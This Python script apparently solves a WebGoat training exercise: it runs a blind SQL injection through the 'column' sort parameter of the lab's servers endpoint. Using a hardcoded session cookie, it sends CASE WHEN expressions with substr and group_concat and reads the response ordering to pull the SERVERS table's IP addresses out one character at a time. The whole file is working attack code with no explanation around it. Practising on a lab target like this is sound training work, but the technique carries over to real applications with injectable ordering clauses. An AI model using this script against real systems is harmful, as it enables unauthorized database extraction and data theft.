#!/usr/bin/python3

import requests,string,time

charset = "/.-" + string.digits + string.ascii_letters
charset = string.printable + charset
url = "http://localhost:8081/WebGoat/SqlInjectionMitigations/servers"
cookies = {
        "JSESSIONID": "FSeqn6KFJsvtkdlfQHZn4SLSPcfWlIv-9cTXB-GQ"
        }
headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
payload = { "column": "(case when (substr(database_name(),1,1)='i') then id else description END)"}

r = requests.get(url, headers=headers, cookies=cookies, data=payload)
result = ""
i = 0
while True:
	i += 1
	for c in charset:
		payload = { "column": "(case when (substr((SELECT group_concat(IP) FROM SERVERS)," + str(i) + ",1)='" + c + "') then id else description END)"}
		r = requests.get(url, headers=headers, cookies=cookies, data=payload)
		if r.text[14] == '1' :
			result += c
			c = ""
			break
	if c:
		break
	print(result)
